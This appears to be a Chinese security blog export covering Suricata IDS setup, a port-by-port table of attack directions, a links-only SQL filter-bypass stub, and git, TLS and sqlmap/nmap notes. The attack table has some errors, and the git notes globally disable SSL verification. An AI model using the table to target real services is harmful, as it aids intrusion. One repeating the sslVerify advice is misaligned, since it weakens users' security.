class="line-numbers-rows"><span></span></span></code></pre><p>最后重新开始测量。</p><h2 id="3-5-规则源的CRUD"><a href="#3-5-规则源的CRUD" class="headerlink" title="3.5 规则源的CRUD"></a>3.5 规则源的CRUD</h2><h3 id="3-5-1-列出我们使用的规则源"><a href="#3-5-1-列出我们使用的规则源" class="headerlink" title="3.5.1 列出我们使用的规则源"></a>3.5.1 列出我们使用的规则源</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># suricata-update list-enabled-sources</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603701147686.png" alt="1603701147686"></p><h3 id="3-5-2-更新规则源"><a href="#3-5-2-更新规则源" class="headerlink" title="3.5.2 更新规则源"></a>3.5.2 更新规则源</h3><pre><code>[root@m01ly ~]#suricata-update update-sources</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700557845.png" alt="1603700557845"></p><h3 id="3-5-3-删除某个规则源"><a href="#3-5-3-删除某个规则源" class="headerlink" title="3.5.3 删除某个规则源"></a>3.5.3 删除某个规则源</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update remove-source et/pro</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-5-4-启动某个规则源"><a href="#3-5-4-启动某个规则源" class="headerlink" title="3.5.4 启动某个规则源"></a>3.5.4 启动某个规则源</h3><p>启用ptresearch/attackdetection的规则集：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update enable-source ptresearch/attackdetection</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700718529.png" alt="1603700718529"></p><h2 id="3-6-规则的CRUD"><a href="#3-6-规则的CRUD" class="headerlink" title="3.6 规则的CRUD"></a>3.6 规则的CRUD</h2><p> <a href="https://suricata-update.readthedocs.io/en/latest/update.html#rule-matching">https://suricata-update.readthedocs.io/en/latest/update.html#rule-matching</a> </p><h1 id="4-一个实例"><a href="#4-一个实例" class="headerlink" title="4 一个实例"></a>4 一个实例</h1><p>/var/lib/suricata/rules/下创建一个test.rules,内容为：</p><pre class="line-numbers language-bash"><code class="language-bash">alert http any any -<span class="token operator">></span> any any <span class="token punctuation">(</span>msg:<span class="token string">"hit baidu.com..."</span><span class="token punctuation">;</span>content:<span class="token string">"baidu"</span><span class="token punctuation">;</span> reference:url, www.baidu.com<span class="token punctuation">;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改配置文件/etc/suricata/suricata.yaml，再规则下添test.rules</p><pre><code>#启动suricata#sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml    -i eth0</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603858949410.png" alt="1603858949410"></p><h1 id="5-suricata-分析包功能"><a href="#5-suricata-分析包功能" class="headerlink" title="5 suricata 分析包功能"></a>5 suricata 分析包功能</h1><p> 分析单个包：suricata -r pcap文件名 -l 自定义输出位置</p><p> 分析文件夹里所以的包：suricata -r pcap文件夹名 -l 自定义输出位置 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -r /tmp/test.cap -l  /var/log/suricata/cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603955429308.png" alt="1603955429308"></p><p><img src="/2020/09/11/install-guide-suricata/1603955464136.png" alt="1603955464136"></p><h1 id="6-卸载suricata"><a href="#6-卸载suricata" class="headerlink" title="6 卸载suricata"></a>6 卸载suricata</h1><pre><code>[root@ids0001 ~]# find / -name suricata /run/suricata/etc/suricata/root/suricata-5.0.0/python/suricata/root/suricata-5.0.0/suricata-update/suricata/var/lib/suricata/var/log/suricata/usr/bin/suricata/usr/lib/python2.7/site-packages/suricata/usr/share/doc/suricata/usr/share/suricata/usr/share/kibana/x-pack/plugins/siem/public/components/timeline/body/renderers/suricata/usr/local/bin/suricata/usr/local/etc/suricata/usr/local/lib/python2.7/site-packages/suricata/usr/local/share/suricata/usr/local/share/doc/suricata/usr/local/var/log/suricata/usr/local/var/run/suricata/usr/local/var/lib/suricata/home/supper-user/suricata-5.0.0/src/suricata/home/supper-user/suricata-5.0.0/src/.libs/suricata/home/supper-user/suricata-5.0.0/python/suricata/home/supper-user/suricata-5.0.0/python/lib/suricata/home/supper-user/suricata-5.0.0/suricata-update/suricata/home/supper-user/suricata-5.0.0/suricata-update/lib/suricata</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603877103161.png" alt="1603877103161"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> -rf /run/suricata \/etc/suricata \/root/suricata-5.0.0/python/suricata \/root/suricata-5.0.0/suricata-update/suricata \/var/lib/suricata \/var/log/suricata \/usr/bin/suricata \/usr/lib/python2.7/site-packages/suricata \/usr/share/doc/suricata \/usr/share/suricata \/usr/share/kibana/x-pack/plugins/siem/public/components/timeline/body/renderers/suricata \/usr/local/bin/suricata \/usr/local/etc/suricata \/usr/local/lib/python2.7/site-packages/suricata \/usr/local/share/suricata \/usr/local/share/doc/suricata \/usr/local/var/log/suricata \/usr/local/var/run/suricata \/usr/local/var/lib/suricata \/home/supper-user/suricata-5.0.0/src/suricata \/home/supper-user/suricata-5.0.0/src/.libs/suricata \/home/supper-user/suricata-5.0.0/python/suricata \/home/supper-user/suricata-5.0.0/python/lib/suricata \/home/supper-user/suricata-5.0.0/suricata-update/suricata \/home/supper-user/suricata-5.0.0/suricata-update/lib/suricata<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="7-error"><a href="#7-error" class="headerlink" title="7 error"></a>7 error</h1><p>错误1 eth0网卡不存在</p><p><img src="/2020/09/11/install-guide-suricata/1603876350581.png" alt="1603876350581"></p><pre class="line-numbers language-bash"><code class="language-bash">9:25 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_INVALID_ARGUMENT<span class="token punctuation">(</span>13<span class="token punctuation">)</span><span class="token punctuation">]</span> - eve-log dns version not found, forcing it to version 228/10/2020 -- 09:09:25 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_INVALID_ARGUMENT<span class="token punctuation">(</span>13<span class="token punctuation">)</span><span class="token punctuation">]</span> - eve-log dns version not found, forcing it to version 228/10/2020 -- 09:09:33 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_SYSCALL<span class="token punctuation">(</span>50<span class="token punctuation">)</span><span class="token punctuation">]</span> - Failure when trying to <span class="token keyword">set</span> feature via ioctl <span class="token keyword">for</span> <span class="token string">'eth0'</span><span class="token keyword">:</span> Operation not supported <span class="token punctuation">(</span>95<span class="token punctuation">)</span>28/10/2020 -- 09:09:33 - <span class="token operator">&lt;</span>Notice<span class="token operator">></span> - all 2 packet processing threads, 4 management threads initialized, engine started.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>错误2  内存不够</p><p><img src="/2020/09/11/install-guide-suricata/1604628379983.png" alt="1604628379983"></p><pre class="line-numbers language-bash"><code class="language-bash">root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># suricata -T6/11/2020 -- 02:05:11 - &lt;Info> - Running suricata under test mode6/11/2020 -- 02:05:11 - &lt;Notice> - This is Suricata version 6.0.0 RELEASE running in SYSTEM mode6/11/2020 -- 02:05:21 - &lt;Error> - [ERRCODE: SC_ERR_MEM_ALLOC(1)] - SCRealloc failed: Cannot allocate memory, while trying to allocate 67108864 bytes6/11/2020 -- 02:05:22 - &lt;Error> - [ERRCODE: SC_ERR_FATAL(171)] - Out of memory. The engine cannot be initialized.Exiting...</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启解决</p><p>问题三：内存不够 </p><p><img src="/2020/09/11/install-guide-suricata/1604629087216.png" alt="1604629087216"></p><pre class="line-numbers language-bash"><code class="language-bash">6/11/2020 -- 02:16:45 - <span class="token operator">&lt;</span>Notice<span class="token operator">></span> - This is Suricata version 6.0.0 RELEASE running <span class="token keyword">in</span> SYSTEM mode6/11/2020 -- 02:16:54 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_SYSCALL<span class="token punctuation">(</span>50<span class="token punctuation">)</span><span class="token punctuation">]</span> - Failure when trying to <span class="token keyword">set</span> feature via ioctl <span class="token keyword">for</span> <span class="token string">'eth0'</span><span class="token keyword">:</span> Operation not supported <span class="token punctuation">(</span>95<span class="token punctuation">)</span>6/11/2020 -- 02:16:54 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_INITIALIZATION<span class="token punctuation">(</span>45<span class="token punctuation">)</span><span class="token punctuation">]</span> - Unix socket: UNIX socket bind<span class="token punctuation">(</span>/usr/local/var/run/suricata/suricata-command.socket<span class="token punctuation">)</span> error: No space left on device6/11/2020 -- 02:16:54 - <span class="token operator">&lt;</span>Error<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_FATAL<span class="token punctuation">(</span>171<span class="token punctuation">)</span><span class="token punctuation">]</span> - Unable to create unix <span class="token function">command</span> socket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>8所有命令</p><pre><code>1.安装必要库(1)检查是否安装了jansson,这是Suricata输出的日志文件eve.json必备库可参考:彻底解决Suricata Eve-log support not compiled in 问题(2)安装pfring2.安装Suricatahttps://suricata-ids.org/download/下载安装包(1)解压安装包tar -zxf suricata-4.1.0.tar.gz(2)编译和安装./configure -enable-pfring --with-libpfring-includes=/opt/pfring/include --with-libpfring-libraries=/opt/pfring/lib -with-libjansson libraries=/usr/lib64/ --with-libjansson-includes=/usr/includemakemake install(3)创建必要的目录，这些目录都是suricata.yaml配置文件中写好的路径，但不会主动创建，需要手动创建mkdir /usr/local/etc/suricata/ #配置文件目录cp suricata-4.1.0/classification.config /usr/local/etc/suricata/cp suricata-4.1.0/reference.config /usr/local/etc/suricata/cp suricata-4.1.0/suricata.yaml /usr/local/etc/suricata/cp suricata-4.1.0/threshold.config /usr/local/etc/suricata/mkdir /usr/local/var/run/suricatamkdir /usr/local/var/log/suricata/ #suricata默认日志输出位置(4)离线安装规则在https://rules.emergingthreats.net/open/,中下载emerging.rules.tar.gztar -zxf emerging.rules.tar.gzrm -rf /usr/local/share/suricata/rulesmv rules /usr/local/share/suricata/(5)运行suricata/usr/local/bin/suricata --pfring-int=em1 --pfring-cluster-id=99 --pfring-cluster-type=cluster_flow -c /usr/local/etc/suricata/suricata.yaml -D(6)输出的日志的类型可以在suricata.yaml中进行设置</code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/d81db4c352af">Suricata默认规则集的目的与用途</a>   nice</p><p><a href="https://suricata-update.readthedocs.io/en/latest/">suricata-update的官方文档：</a>   规则工具的官网文档 <a href="https://www.osgeo.cn/suricata/rule-management/suricata-update.html">https://www.osgeo.cn/suricata/rule-management/suricata-update.html</a> </p><p><a href="https://zhuanlan.zhihu.com/p/36340468">Suricata规则介绍、以及使用suricata-update做规则管理</a> </p><p><a href="https://zhuanlan.zhihu.com/p/37173608">Suricata IDS 入门 — 规则详解</a>  比较详细</p><p><a href="https://suricata.readthedocs.io/en/suricata-6.0.0/">suricata官方6.0 文档</a> </p><p><a href="https://suricata-update.readthedocs.io/en/latest/update.html#rule-matching">规则的CRUD</a></p><p><a href="http://www.hyuuhit.com/2018/02/11/suricata-config/">suricata命令行参数</a></p><p><a href="https://www.osgeo.cn/suricata/command-line-options.html">suricata命令行参数2</a></p><p><a href="https://www.yuque.com/dekeshile/pkiul1/rrlufv">suricata笔记</a> 不错，较全面</p><p><a href="https://www.yuque.com/dekeshile/pkiul1/rrlufv">suricata较完整的功能列表</a> 后续继续学习</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安装教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql关键词绕过</title>
      <link href="/2020/09/10/pt-sqlbypass/"/>
      <url>/2020/09/10/pt-sqlbypass/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>待完善</p><a id="more"></a><p><a href="https://blog.lgf.im/2018/bypass-tech-for-sql-injection-keyword-filtering.html">https://blog.lgf.im/2018/bypass-tech-for-sql-injection-keyword-filtering.html</a> 较全的基于关键词绕过</p><p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a>  基于extractvalue()和updatexml()的报错注入</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见端口说明和攻击汇总</title>
      <link href="/2020/09/04/pt-portinfo/"/>
      <url>/2020/09/04/pt-portinfo/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h3><a id="more"></a><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">21、22、69</td><td align="left">Ftp/Tftp文件传输协议</td><td align="left">允许匿名的上传、下载、爆破和嗅探</td></tr><tr><td align="left">2049</td><td align="left">Nfs服务</td><td align="left">配置不当</td></tr><tr><td align="left">139</td><td align="left">Samba服务</td><td align="left">爆破、未授权访问、远程代码执行</td></tr><tr><td align="left">389</td><td align="left">Ldap目录访问协议</td><td align="left">注入、允许匿名访问、弱口令</td></tr></tbody></table><h3 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">22</td><td align="left">SSH远程连接</td><td align="left">爆破、SSH隧道及内网代理转发、文件传输</td></tr><tr><td align="left">23</td><td align="left">Telnet远程连接</td><td align="left">爆破、嗅探、弱口令</td></tr><tr><td align="left">3389</td><td align="left">Rdp远程桌面链接</td><td align="left">Shitf后门（<code>Window Server 2003</code>以下系统）、爆破</td></tr><tr><td align="left">5900</td><td align="left">VNC</td><td align="left">弱口令爆破</td></tr><tr><td align="left">5623</td><td align="left">PyAnywhere服务</td><td align="left">抓密码、代码执行</td></tr></tbody></table><h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a>Web应用服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">80/443/8080</td><td align="left">常见的Web服务端口</td><td align="left">Web攻击、爆破、对应服务器版本漏洞，心脏滴血等漏洞</td></tr><tr><td align="left">7001/7002</td><td align="left">WebLogic控制台</td><td align="left">Java反序列化、弱口令</td></tr><tr><td align="left">8080/8089</td><td align="left">Jboss/Resin/Jetty/Jenkins</td><td align="left">反序列化、控制器弱口令</td></tr><tr><td align="left">9090</td><td align="left">WebSphere控制台</td><td align="left">Java反序列化、弱口令</td></tr><tr><td align="left">4848</td><td align="left">GlassFish控制台</td><td align="left">弱口令</td></tr><tr><td align="left">1352</td><td align="left">Lotus domino邮件服务</td><td align="left">弱口令、信息泄露、爆破</td></tr><tr><td align="left">10000</td><td align="left">Webmin-Web控制面板</td><td align="left">弱口令</td></tr></tbody></table><h3 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">3306</td><td align="left">Mysqk</td><td align="left">注入、提权、爆破</td></tr><tr><td align="left">1433</td><td align="left">Mysql数据库</td><td align="left">注入、提权、SA弱口令、爆破</td></tr><tr><td align="left">1521</td><td align="left">Oracle数据库</td><td align="left">TNS爆破、注入、反弹Shell</td></tr><tr><td align="left">5432</td><td align="left">PostgreSQL数据库</td><td align="left">爆破、注入、弱口令</td></tr><tr><td align="left">27017/27018</td><td align="left">MongoDB</td><td align="left">爆破、未授权访问</td></tr><tr><td align="left">6379</td><td align="left">Redis数据库</td><td align="left">尝试未授权访问、弱口令爆破</td></tr><tr><td align="left">5000</td><td align="left">SysBase/DB2数据库</td><td align="left">爆破、注入</td></tr></tbody></table><h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">25</td><td align="left">SMTP邮件服务</td><td align="left">邮件伪造</td></tr><tr><td align="left">110</td><td align="left">POP3协议</td><td align="left">爆破、嗅探</td></tr><tr><td align="left">143</td><td align="left">IMAP协议</td><td align="left">爆破</td></tr></tbody></table><h3 id="网络参加协议端口"><a href="#网络参加协议端口" class="headerlink" title="网络参加协议端口"></a>网络参加协议端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">53</td><td align="left">DNS域名服务器</td><td align="left">允许区域传送、DNS劫持、缓存投毒、欺骗</td></tr><tr><td align="left">67/68</td><td align="left">DHCP服务</td><td align="left">劫持、欺骗</td></tr><tr><td align="left">161</td><td align="left">SNMP协议</td><td align="left">爆破、搜索目标内网信息</td></tr></tbody></table><h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">2181</td><td align="left">Zookeeper服务</td><td align="left">未授权访问</td></tr><tr><td align="left">8069</td><td align="left">Zavvux服务</td><td align="left">远程代码执行、SQL注入</td></tr><tr><td align="left">9200</td><td align="left">9300</td><td align="left">Elasticsearch服务</td></tr><tr><td align="left">11211</td><td align="left">Memcache服务</td><td align="left">未授权访问</td></tr><tr><td align="left">512/513/514</td><td align="left">Linux Rexec服务</td><td align="left">匿名访问、文件上传</td></tr><tr><td align="left">3690</td><td align="left">Svn服务</td><td align="left">Svn泄露、未授权访问</td></tr><tr><td align="left">50000</td><td align="left">SAP Management Console</td><td align="left">远程代码执行</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>m01ly-wiki</title>
      <link href="/2020/09/03/m01ly-wiki/"/>
      <url>/2020/09/03/m01ly-wiki/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文档仅仅是自己安装软件指南或者安装过程中踩的坑。</p><a id="more"></a><h1 id="Git操作"><a href="#Git操作" class="headerlink" title="Git操作"></a>Git操作</h1><h2 id="linux上传git文件"><a href="#linux上传git文件" class="headerlink" title="linux上传git文件"></a>linux上传git文件</h2><p>（1）下载git项目gitalk，并配置git</p><pre><code>git clone https://github.com/m01ly/gitalkcd gitalk[root@xxx gitalk]# git config --global user.name &quot;m01ly&quot;[root@xxx gitalk]# git config --global user.email 2418093296@qq.com</code></pre><p>(2) 添加所有需要上传的文件和配置到git</p><p><code>git add FILE</code>添加确定的文件FILE<br><code>git add .</code>添加当前目录下所有文件</p><pre><code>cd gitalk[root@xxxx gitalk]# git add .</code></pre><p>（3） 提交文件</p><p>上述命令<strong>必须添加</strong>‘-m’及‘log message’，其中log message可以自己随便填写，否则是提交不成功的，在后面的<strong>push操作</strong>中会提示错误：“error:src refspec master does not match any”</p><pre><code>git commit -m &#39;log message&#39;</code></pre><p><img src="/2020/09/03/m01ly-wiki/1615346141835.png" alt="1615346141835"></p><p>至此，我们就已经<strong>提交文件到本地仓库</strong>了！</p><p>现在我们需要将上述本地仓库里的文件<strong>添加到远程库</strong>！</p><p>（4）在github里添加origin</p><pre><code>git remote add origin https://github.com/m01ly/gitalk.git</code></pre><p><strong>注意：</strong>如果之前配置过一次，再次配置则会提示以下错误：<br><strong>ERROR</strong>：远程 origin 已经存在。<br>此时只需要将远程配置删除，重新添加即可；</p><pre><code>git remote rm origingit remote add origin https://github.com/m01ly/gitalk.git</code></pre><p>再次提交文件即可正常使用</p><p>（5）上传文件</p><pre><code>git push -u origin master</code></pre><p>执行此命令后，git会提示输入github账户的用户名和密码，验证通过后，进行文件上传！</p><p><strong>注意：</strong></p><p><strong>ERROR：</strong>error: src refspec master does not match any.<br>error: failed to push some refs to ‘<a href="https://github.com/m01ly/gitalk.git&#39;">https://github.com/m01ly/gitalk.git&#39;</a></p><p><strong>解决方案：</strong>因为 GitHub 从今年 10 月 1 日起，在该平台上创建的所有新的源代码仓库将默认被命名为 “main”，而不是原先的”master” ，因此运行git branch查看名称，</p><p>a.如果是main，直接运行以下即可。</p><pre><code>git push -u origin main</code></pre><p>b.若为master，则改为按如下方式把本地的 master 仓库名称修改为远端的 main即可：</p><p>重命名命令： git branch -m oldBranchName newBranchName</p><p>例如： git branch -m master main</p><p>再重新push：git push -u origin main</p><p>打开git项目，发现提交成功：</p><p><img src="/2020/09/03/m01ly-wiki/1615357682554.png" alt="1615357682554"></p><p>参考：</p><p><a href="https://www.cnblogs.com/chen8023miss/p/12082093.html">git上传linux文件到GitHub上</a></p><p><a href="https://blog.csdn.net/u014361280/article/details/109703556">Git 常见错误 之 error: src refspec xxx does not match any / error: failed to push some refs to 简单解决方法</a></p><h2 id="linux下载git文件"><a href="#linux下载git文件" class="headerlink" title="linux下载git文件"></a>linux下载git文件</h2><p>(1) gitclone项目</p><pre><code>git clone https://github.com/m01ly/gitalk</code></pre><p>报错</p><pre><code>[root@xxx]# git clone https://github.com/m01ly/gitalkCloning into &#39;gitalk&#39;...fatal: unable to access &#39;https://github.com/m01ly/gitalk/&#39;: Problem with the SSL CA cert (path? access rights?)</code></pre><p>解决方案：将http.sslVerify参数的git全局配置为’false’</p><pre><code>root@xxx:~# git config --global http.sslVerify false</code></pre><h1 id="TLS-安全配置"><a href="#TLS-安全配置" class="headerlink" title="TLS 安全配置"></a>TLS 安全配置</h1><h2 id="DHparam"><a href="#DHparam" class="headerlink" title="DHparam"></a>DHparam</h2><h3 id="Diffie-Hellman-group-smaller-than-2048-bits-漏洞"><a href="#Diffie-Hellman-group-smaller-than-2048-bits-漏洞" class="headerlink" title="Diffie-Hellman group smaller than 2048 bits 漏洞"></a>Diffie-Hellman group smaller than 2048 bits 漏洞</h3><p><strong>漏洞描述：</strong></p><ol><li>Diffie-Hellman group smaller than 2048 bits：</li></ol><p>TLS服务器使用Diffie-Hellman组，质数模长度小于2048位。目前的估计是，一个学术团队可以打破768位素数，而一个国家级团队可以打破1024位素数。</p><ol start="2"><li>TLS/SSL Server Is Using Commonly Used Prime Numbers </li></ol><p>在Diffie-Hellman密钥交换期间，服务器使用一个公共素数或默认质数作为参数。这使得安全会话容易受到预计算攻击。攻击者可以花费大量时间为特定质数生成查找/彩虹表。然后，可以使用此查找表获取握手的共享机密并解密会话。</p><p><strong>漏洞分析：</strong></p><p>漏洞1，只需要重新生成2048位DH参数即可。</p><p>漏洞2，因为用了已知的素数，会导致爆破后破解出密钥，因此只需要升级到2048位参数，在2048位DH组下进行这种攻击的可行性被评估为不确定且未经证实。</p><p><strong>漏洞解决方法：</strong>重新生成2048位dhparams。nginx配置如下，其他容器详见<a href="https://weakdh.org/sysadmin.html">https://weakdh.org/sysadmin.html</a> 。</p><p>1 利用openssl生成2048bit dhparams.pem命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">openssl dhparam -out dhparams.pem 2048<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>dh协议文件生成速度随长度增长而急剧增长，使用随机数种子可以加快生成速度，如下所示</p><pre class="line-numbers language-bash"><code class="language-bash">openssl dhparam -rand rand.seed -out dhparams.pem 2048<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2 nginx配置 （nginx.conf文件）：ssl_dhparam dhparams.pem的路径; </p><p><strong>参考：</strong></p><p><a href="https://weakdh.org/sysadmin.html">官方TLS部署Diffie-Hellman指南，包括apache,iis环境下的配置</a>   </p><p>TLS 的nginx安全配置](<a href="https://gist.github.com/fotock/9cf9afc2fd0f813828992ebc4fdaad6f">https://gist.github.com/fotock/9cf9afc2fd0f813828992ebc4fdaad6f</a>)  </p><p><a href="https://kb.fortinet.com/kb/documentLink.do?externalID=FD43985">https://kb.fortinet.com/kb/documentLink.do?externalID=FD43985</a>   <a href="https://www.rapid7.com/db/vulnerabilities/tls-dh-primes">https://www.rapid7.com/db/vulnerabilities/tls-dh-primes</a> 解决方法</p><p><a href="https://www.openssl.org/docs/man1.1.0/man1/dhparam.html">openssl生成 dhparam具体用法</a>  </p><p><a href="https://weakdh.org/logjam.html">https://weakdh.org/logjam.html</a>   <a href="https://weakdh.org/">https://weakdh.org/</a> 相关DH的攻击</p><p><a href="https://www.cnblogs.com/f-ck-need-u/p/7103791.html">加快生成速度</a>  </p><h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><h2 id="centos-安装sqlmap"><a href="#centos-安装sqlmap" class="headerlink" title="centos 安装sqlmap"></a>centos 安装sqlmap</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># git clone https://github.com/sqlmapproject/sqlmap.git</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd sqlmap</span><span class="token punctuation">[</span>root@m01ly sqlmap<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ./sqlmap.py -h</span>        ___       __H__ ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;1.4.9.1#dev&amp;#125;</span><span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token keyword">.</span> <span class="token punctuation">[</span>,<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token keyword">.</span><span class="token string">'| . ||___|_  [,]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.orgUsage: python sqlmap.py [options]Options:  -h, --help            Show basic help message and exit  -hh                   Show advanced help message and exit  --version             Show program'</span>s version number and <span class="token keyword">exit</span>  -v VERBOSE            Verbosity level: 0-6 <span class="token punctuation">(</span>default 1<span class="token punctuation">)</span>  Target:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="centos-安装最新nmap"><a href="#centos-安装最新nmap" class="headerlink" title="centos 安装最新nmap"></a>centos 安装最新nmap</h2><p><a href="https://www.linuxidc.com/topicnews.aspx?tid=14">CentOS</a> 7下直接yum安装nmap</p><pre><code># yum install nmap发现并不是最新版本，而且升级一下看看，发现也不能直接升级。只好再直接yum卸载掉。**按官方文档rpm安装最新版本的nmap**[root@localhost www.linuxidc.com]# rpm -vhU https://nmap.org/dist/nmap-7.80-1.x86_64.rpm获取https://nmap.org/dist/nmap-7.80-1.x86_64.rpm准备中...             ################################# [100%]正在升级/安装... 1:nmap-2:7.80-1          ################################# [100%]</code></pre><h1 id="源码安装nmap"><a href="#源码安装nmap" class="headerlink" title="源码安装nmap"></a>源码安装nmap</h1><pre><code>wget https://nmap.org/dist-old/nmap-4.53.tgztar -zxvf nmap-4.53.tgzcd nmap-4.53./configuremakemake installnmap -v</code></pre><p><a href="https://nmap.org/dist-old/">https://nmap.org/dist-old/</a></p><p><a href="https://www.jianshu.com/p/b86c3b114cce">https://www.jianshu.com/p/b86c3b114cce</a></p><h2 id="查看linux具体系统"><a href="#查看linux具体系统" class="headerlink" title="查看linux具体系统"></a>查看linux具体系统</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># lsb_release -a</span>LSB Version:    :core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarchDistributor ID: CentOSDescription:    CentOS Linux release 7.7.1908 <span class="token punctuation">(</span>Core<span class="token punctuation">)</span>Release:        7.7.1908Codename:       Core<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装kali"><a href="#安装kali" class="headerlink" 